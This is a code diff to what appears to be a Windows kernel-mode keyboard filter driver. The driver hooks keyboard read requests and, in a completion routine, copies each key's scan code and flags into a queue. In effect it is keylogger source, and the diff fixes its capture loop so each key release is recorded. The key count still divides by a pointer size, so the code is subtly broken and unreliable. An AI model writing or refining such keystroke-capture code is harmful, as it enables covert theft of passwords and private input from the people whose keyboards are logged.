@@ -53,6 +53,8 @@ NTSTATUS HookDevicePassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 NTSTATUS HookDeviceRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
 
+//must call on dispatch fun
+    PIO_STACK_LOCATION curIrpStack = IoGetCurrentIrpStackLocation(pIrp);
 	IoCopyCurrentIrpStackLocationToNext(pIrp);
 	IoSetCompletionRoutine(pIrp, HookDeviceReadComplete, pDeviceObject->DeviceExtension, true, true, true);
 	g_PendingWrite++;
@@ -62,7 +64,7 @@ NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID C
 {/*DISPATCH LEVEL*/
 	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pDeviceObject->DeviceExtension;
 	PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
-	
+	 PIO_STACK_LOCATION curIrpStack = IoGetCurrentIrpStackLocation(pIrp);
 	if (pIrp->IoStatus.Status == STATUS_SUCCESS){
 		int KeyCount = pIrp->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);
 		int i;
@@ -72,11 +74,13 @@ NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID C
 
 		for (i=0; i<KeyCount; i++)
 		{
+            if (pKeyData[i].Flags != KEY_BREAK)
+                continue;
 			DbgPrint("Key up");
 			KEY_DATA *kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
 			RtlZeroMemory(kData, sizeof(KEY_DATA));
-			kData->KeyData = pKeyData->MakeCode;
-			kData->KeyFlags = pKeyData->Flags;
+			kData->KeyData = pKeyData[i].MakeCode;
+			kData->KeyFlags = pKeyData[i].Flags;
 			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->MessageList,&kData->ListEntry,&pKeyboardDeviceExtension->kLock);
 			KeReleaseSemaphore(&pKeyboardDeviceExtension->sem,0,1, false);	
 
